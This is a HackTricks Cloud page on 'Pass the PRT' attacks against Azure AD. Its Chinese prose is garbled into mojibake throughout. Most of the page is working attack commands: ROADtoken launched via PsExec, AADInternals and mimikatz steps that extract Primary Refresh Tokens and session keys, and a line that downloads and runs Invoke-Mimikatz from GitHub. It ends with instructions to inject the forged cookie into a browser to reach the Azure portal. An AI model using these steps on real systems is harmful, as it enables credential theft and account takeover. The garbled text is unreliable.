# Az - Pass the PRT

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä»€ä¹ˆæ˜¯ PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### æ£€æŸ¥æ‚¨æ˜¯å¦æ‹¥æœ‰ PRT
```
Dsregcmd.exe /status
```
åœ¨ SSO çŠ¶æ€éƒ¨åˆ†ï¼Œæ‚¨åº”è¯¥çœ‹åˆ° **`AzureAdPrt`** è®¾ç½®ä¸º **YES**ã€‚

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

åœ¨åŒä¸€è¾“å‡ºä¸­ï¼Œæ‚¨è¿˜å¯ä»¥çœ‹åˆ° **è®¾å¤‡æ˜¯å¦å·²åŠ å…¥ Azure**ï¼ˆåœ¨å­—æ®µ `AzureAdJoined` ä¸­ï¼‰ï¼š

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

PRT cookie å®é™…ä¸Šè¢«ç§°ä¸º **`x-ms-RefreshTokenCredential`**ï¼Œå®ƒæ˜¯ä¸€ä¸ª JSON Web Token (JWT)ã€‚JWT åŒ…å« **3 éƒ¨åˆ†**ï¼Œ**å¤´éƒ¨**ã€**æœ‰æ•ˆè½½è·**å’Œ **ç­¾å**ï¼Œç”± `.` åˆ†éš”ï¼Œå¹¶ä¸”éƒ½æ˜¯ URL å®‰å…¨çš„ base64 ç¼–ç ã€‚ä¸€ä¸ªå…¸å‹çš„ PRT cookie åŒ…å«ä»¥ä¸‹å¤´éƒ¨å’Œä¸»ä½“ï¼š
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
å®é™…çš„ **Primary Refresh Token (PRT)** è¢«å°è£…åœ¨ **`refresh_token`** ä¸­ï¼Œè¯¥ä»¤ç‰Œç”± Azure AD æ§åˆ¶çš„å¯†é’¥åŠ å¯†ï¼Œä½¿å…¶å†…å®¹å¯¹æˆ‘ä»¬æ¥è¯´æ˜¯ä¸å¯è§å’Œæ— æ³•è§£å¯†çš„ã€‚å­—æ®µ **`is_primary`** è¡¨ç¤ºè¯¥ä»¤ç‰Œä¸­å°è£…äº†ä¸»åˆ·æ–°ä»¤ç‰Œã€‚ä¸ºäº†ç¡®ä¿ cookie ä¿æŒä¸å…¶é¢„æœŸçš„ç‰¹å®šç™»å½•ä¼šè¯ç»‘å®šï¼Œ`request_nonce` ä» `logon.microsoftonline.com` é¡µé¢ä¼ è¾“ã€‚

### ä½¿ç”¨ TPM çš„ PRT Cookie æµ

**LSASS** è¿›ç¨‹å°†å‘ TPM å‘é€ **KDF ä¸Šä¸‹æ–‡**ï¼ŒTPM å°†ä½¿ç”¨ **ä¼šè¯å¯†é’¥**ï¼ˆåœ¨è®¾å¤‡æ³¨å†Œåˆ° AzureAD æ—¶æ”¶é›†å¹¶å­˜å‚¨åœ¨ TPM ä¸­ï¼‰å’Œå…ˆå‰çš„ä¸Šä¸‹æ–‡æ¥ **æ´¾ç”Ÿ** ä¸€ä¸ª **å¯†é’¥**ï¼Œè¯¥ **æ´¾ç”Ÿå¯†é’¥** ç”¨äº **ç­¾å PRT cookie (JWT)**ã€‚

**KDF ä¸Šä¸‹æ–‡æ˜¯** æ¥è‡ª AzureAD çš„éšæœºæ•°å’Œ PRT åˆ›å»ºçš„ **JWT** ä¸ **ä¸Šä¸‹æ–‡**ï¼ˆéšæœºå­—èŠ‚ï¼‰æ··åˆã€‚

å› æ­¤ï¼Œå³ä½¿ PRT ä¸èƒ½è¢«æå–ï¼Œå› ä¸ºå®ƒä½äº TPM å†…éƒ¨ï¼Œä½†å¯ä»¥æ»¥ç”¨ LSASS æ¥ **è¯·æ±‚æ¥è‡ªæ–°ä¸Šä¸‹æ–‡çš„æ´¾ç”Ÿå¯†é’¥å¹¶ä½¿ç”¨ç”Ÿæˆçš„å¯†é’¥æ¥ç­¾å Cookies**ã€‚

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT æ»¥ç”¨åœºæ™¯

ä½œä¸º **æ™®é€šç”¨æˆ·**ï¼Œå¯ä»¥é€šè¿‡è¯·æ±‚ LSASS è·å– SSO æ•°æ®æ¥ **è¯·æ±‚ PRT ä½¿ç”¨**ã€‚\
è¿™å¯ä»¥åƒ **æœ¬åœ°åº”ç”¨ç¨‹åº** ä¸€æ ·å®Œæˆï¼Œè¿™äº›åº”ç”¨ç¨‹åºä» **Web Account Manager**ï¼ˆä»¤ç‰Œä»£ç†ï¼‰è¯·æ±‚ä»¤ç‰Œã€‚WAM å°†è¯·æ±‚ä¼ é€’ç»™ **LSASS**ï¼Œåè€…ä½¿ç”¨ç­¾åçš„ PRT æ–­è¨€è¯·æ±‚ä»¤ç‰Œã€‚æˆ–è€…å¯ä»¥é€šè¿‡ **åŸºäºæµè§ˆå™¨çš„ (web) æµ** å®Œæˆï¼Œå…¶ä¸­ **PRT cookie** ç”¨ä½œ **å¤´éƒ¨** æ¥éªŒè¯å¯¹ Azure AS ç™»å½•é¡µé¢çš„è¯·æ±‚ã€‚

ä½œä¸º **SYSTEM**ï¼Œå¦‚æœæ²¡æœ‰å—åˆ° TPM ä¿æŠ¤ï¼Œå¯ä»¥ **çªƒå– PRT** æˆ– **ä½¿ç”¨åŠ å¯† API ä¸ LSASS ä¸­çš„ PRT å¯†é’¥äº¤äº’**ã€‚

## Pass-the-PRT æ”»å‡»ç¤ºä¾‹

### æ”»å‡» - ROADtoken

æœ‰å…³æ­¤æ–¹æ³•çš„æ›´å¤šä¿¡æ¯ [**è¯·æŸ¥çœ‹æ­¤å¸–å­**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)ã€‚ROADtoken å°†ä»æ­£ç¡®çš„ç›®å½•è¿è¡Œ **`BrowserCore.exe`** å¹¶ä½¿ç”¨å®ƒæ¥ **è·å– PRT cookie**ã€‚ç„¶åå¯ä»¥ä½¿ç”¨æ­¤ cookie ä¸ ROADtools è¿›è¡Œèº«ä»½éªŒè¯å¹¶ **è·å–æŒä¹…åˆ·æ–°ä»¤ç‰Œ**ã€‚

è¦ç”Ÿæˆæœ‰æ•ˆçš„ PRT cookieï¼Œæ‚¨éœ€è¦çš„ç¬¬ä¸€ä»¶äº‹æ˜¯ä¸€ä¸ªéšæœºæ•°ã€‚\
æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–ï¼š
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
æˆ–ä½¿ç”¨ [**roadrecon**](https://github.com/dirkjanm/ROADtools)ï¼š
```powershell
roadrecon auth prt-init
```
ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨ [**roadtoken**](https://github.com/dirkjanm/ROADtoken) æ¥è·å–æ–°çš„ PRTï¼ˆä»ç”¨æˆ·çš„è¿›ç¨‹ä¸­è¿è¡Œè¯¥å·¥å…·è¿›è¡Œæ”»å‡»ï¼‰ï¼š
```powershell
.\ROADtoken.exe <nonce>
```
ä½œä¸ºå•è¡Œå‘½ä»¤ï¼š 

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨**ç”Ÿæˆçš„cookie**æ¥**ç”Ÿæˆä»¤ç‰Œ**ä»¥ä½¿ç”¨Azure AD **Graph**æˆ–Microsoft Graphè¿›è¡Œ**ç™»å½•**ï¼š
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### æ”»å‡» - ä½¿ç”¨ roadrecon

### æ”»å‡» - ä½¿ç”¨ AADInternals å’Œæ³„éœ²çš„ PRT

`Get-AADIntUserPRTToken` **ä» Azure AD åŠ å…¥æˆ–æ··åˆåŠ å…¥çš„è®¡ç®—æœºè·å–ç”¨æˆ·çš„ PRT ä»¤ç‰Œ**ã€‚ä½¿ç”¨ `BrowserCore.exe` è·å– PRT ä»¤ç‰Œã€‚
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
æˆ–è€…ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰æ¥è‡ª Mimikatz çš„å€¼ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ AADInternals ç”Ÿæˆä»¤ç‰Œï¼š
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
å‰å¾€ [https://login.microsoftonline.com](https://login.microsoftonline.com)ï¼Œæ¸…é™¤æ‰€æœ‰ login.microsoftonline.com çš„ cookiesï¼Œå¹¶è¾“å…¥ä¸€ä¸ªæ–°çš„ cookieã€‚
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
ç„¶åè®¿é—® [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
å…¶ä½™çš„åº”è¯¥æ˜¯é»˜è®¤è®¾ç½®ã€‚ç¡®ä¿æ‚¨å¯ä»¥åˆ·æ–°é¡µé¢å¹¶ä¸” cookie ä¸ä¼šæ¶ˆå¤±ï¼Œå¦‚æœæ¶ˆå¤±äº†ï¼Œæ‚¨å¯èƒ½çŠ¯äº†é”™è¯¯ï¼Œéœ€è¦é‡æ–°è¿›è¡Œè¯¥è¿‡ç¨‹ã€‚å¦‚æœæ²¡æœ‰æ¶ˆå¤±ï¼Œæ‚¨åº”è¯¥æ²¡é—®é¢˜ã€‚
{% endhint %}

### æ”»å‡» - Mimikatz

#### æ­¥éª¤

1. **PRTï¼ˆä¸»åˆ·æ–°ä»¤ç‰Œï¼‰ä» LSASSï¼ˆæœ¬åœ°å®‰å…¨æˆæƒå­ç³»ç»ŸæœåŠ¡ï¼‰ä¸­æå–**å¹¶å­˜å‚¨ä»¥ä¾›åç»­ä½¿ç”¨ã€‚
2. **æ¥ä¸‹æ¥æå–ä¼šè¯å¯†é’¥**ã€‚ç”±äºæ­¤å¯†é’¥æœ€åˆç”±æœ¬åœ°è®¾å¤‡å‘å‡ºï¼Œç„¶åé‡æ–°åŠ å¯†ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ DPAPI ä¸»å¯†é’¥è¿›è¡Œè§£å¯†ã€‚æœ‰å…³ DPAPIï¼ˆæ•°æ®ä¿æŠ¤ APIï¼‰çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…è¿™äº›èµ„æºï¼š[HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)ï¼Œæœ‰å…³å…¶åº”ç”¨çš„ç†è§£ï¼Œè¯·å‚é˜… [Pass-the-cookie attack](az-pass-the-cookie.md)ã€‚
3. åœ¨è§£å¯†ä¼šè¯å¯†é’¥åï¼Œ**è·å¾— PRT çš„æ´¾ç”Ÿå¯†é’¥å’Œä¸Šä¸‹æ–‡**ã€‚è¿™äº›å¯¹äº**åˆ›å»º PRT cookie**è‡³å…³é‡è¦ã€‚å…·ä½“è€Œè¨€ï¼Œæ´¾ç”Ÿå¯†é’¥ç”¨äºç­¾ç½²æ„æˆ cookie çš„ JWTï¼ˆJSON Web Tokenï¼‰ã€‚Dirk-jan æä¾›äº†å¯¹æ­¤è¿‡ç¨‹çš„å…¨é¢è§£é‡Šï¼Œå¯ä»¥åœ¨ [è¿™é‡Œ](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/) æ‰¾åˆ°ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ PRT åœ¨ TPM ä¸­è€Œä¸åœ¨ `lsass` ä¸­ï¼Œ**mimikatz å°†æ— æ³•æå–å®ƒ**ã€‚\
ä½†æ˜¯ï¼Œå¯ä»¥ä» TPM çš„ä¸Šä¸‹æ–‡ä¸­**è·å–æ´¾ç”Ÿå¯†é’¥çš„å¯†é’¥**å¹¶ä½¿ç”¨å®ƒæ¥**ç­¾ç½² cookieï¼ˆæ£€æŸ¥é€‰é¡¹ 3ï¼‰ã€‚**
{% endhint %}

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°**æå–è¿™äº›è¯¦ç»†ä¿¡æ¯çš„æ·±å…¥è§£é‡Š**ï¼š[**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
åœ¨ 2021 å¹´ 8 æœˆçš„ä¿®å¤åï¼Œè¿™å°†æ— æ³•å‡†ç¡®è·å–å…¶ä»–ç”¨æˆ·çš„ PRT ä»¤ç‰Œï¼Œå› ä¸ºåªæœ‰ç”¨æˆ·å¯ä»¥è·å–ä»–çš„ PRTï¼ˆæœ¬åœ°ç®¡ç†å‘˜æ— æ³•è®¿é—®å…¶ä»–ç”¨æˆ·çš„ PRTï¼‰ï¼Œä½†å¯ä»¥è®¿é—®ä»–çš„ã€‚
{% endhint %}

æ‚¨å¯ä»¥ä½¿ç”¨ **mimikatz** æå– PRTï¼š
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**å¤åˆ¶**æ ‡è®°ä¸º**Prt**çš„éƒ¨åˆ†å¹¶ä¿å­˜ã€‚\
è¿˜è¦æå–ä¼šè¯å¯†é’¥ï¼ˆ**`ProofOfPossesionKey`**å­—æ®µçš„**`KeyValue`**ï¼‰ï¼Œæ‚¨å¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°é«˜äº®æ˜¾ç¤ºçš„éƒ¨åˆ†ã€‚è¿™ä¸ªæ˜¯åŠ å¯†çš„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æˆ‘ä»¬çš„DPAPIä¸»å¯†é’¥æ¥è§£å¯†å®ƒã€‚

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
å¦‚æœæ‚¨æ²¡æœ‰çœ‹åˆ°ä»»ä½•PRTæ•°æ®ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ‚¨**æ²¡æœ‰ä»»ä½•PRT**ï¼Œå› ä¸ºæ‚¨çš„è®¾å¤‡æ²¡æœ‰åŠ å…¥Azure ADï¼Œæˆ–è€…æ‚¨å¯èƒ½åœ¨**è¿è¡Œæ—§ç‰ˆæœ¬**çš„Windows 10ã€‚
{% endhint %}

è¦**è§£å¯†**ä¼šè¯å¯†é’¥ï¼Œæ‚¨éœ€è¦**æå‡**æ‚¨çš„æƒé™åˆ°**SYSTEM**ï¼Œä»¥åœ¨è®¡ç®—æœºä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä»¥ä¾¿èƒ½å¤Ÿä½¿ç”¨**DPAPIä¸»å¯†é’¥è¿›è¡Œè§£å¯†**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®ç°ï¼š
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### é€‰é¡¹ 1 - å®Œæ•´çš„ Mimikatz

* ç°åœ¨ä½ æƒ³å¤åˆ¶ä¸Šä¸‹æ–‡å€¼ï¼š

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* ä»¥åŠæ´¾ç”Ÿå¯†é’¥å€¼ï¼š

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* æœ€åï¼Œä½ å¯ä»¥ä½¿ç”¨æ‰€æœ‰è¿™äº›ä¿¡æ¯æ¥ **ç”Ÿæˆ PRT cookies**ï¼š
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* è®¿é—® [https://login.microsoftonline.com](https://login.microsoftonline.com)ï¼Œæ¸…é™¤æ‰€æœ‰ login.microsoftonline.com çš„ cookiesï¼Œå¹¶è¾“å…¥ä¸€ä¸ªæ–°çš„ cookieã€‚
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* ç„¶åè®¿é—® [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
å…¶ä½™éƒ¨åˆ†åº”ä¸ºé»˜è®¤è®¾ç½®ã€‚ç¡®ä¿æ‚¨å¯ä»¥åˆ·æ–°é¡µé¢å¹¶ä¸” cookie ä¸ä¼šæ¶ˆå¤±ï¼Œå¦‚æœæ¶ˆå¤±äº†ï¼Œæ‚¨å¯èƒ½çŠ¯äº†é”™è¯¯ï¼Œéœ€è¦é‡æ–°è¿›è¡Œè¯¥è¿‡ç¨‹ã€‚å¦‚æœæ²¡æœ‰æ¶ˆå¤±ï¼Œæ‚¨åº”è¯¥æ²¡é—®é¢˜ã€‚
{% endhint %}

#### é€‰é¡¹ 2 - ä½¿ç”¨ PRT çš„ roadrecon

* é¦–å…ˆæ›´æ–° PRTï¼Œè¿™å°†å…¶ä¿å­˜åœ¨ `roadtx.prt` ä¸­ï¼š

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨äº¤äº’å¼æµè§ˆå™¨é€šè¿‡ `roadtx browserprtauth` **è¯·æ±‚ä»¤ç‰Œ**ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨ `roadtx describe` å‘½ä»¤ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°è®¿é—®ä»¤ç‰ŒåŒ…å«ä¸€ä¸ª MFA å£°æ˜ï¼Œå› ä¸ºæˆ‘åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨çš„ PRT ä¹Ÿæœ‰ä¸€ä¸ª MFA å£°æ˜ã€‚
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### é€‰é¡¹ 3 - ä½¿ç”¨æ´¾ç”Ÿå¯†é’¥çš„ roadrecon

åœ¨è·å¾—ä¸Šä¸‹æ–‡å’Œé€šè¿‡ mimikatz è½¬å‚¨çš„æ´¾ç”Ÿå¯†é’¥åï¼Œå¯ä»¥ä½¿ç”¨ roadrecon ç”Ÿæˆä¸€ä¸ªæ–°çš„ç­¾å cookieï¼š 

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## å‚è€ƒæ–‡çŒ®

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
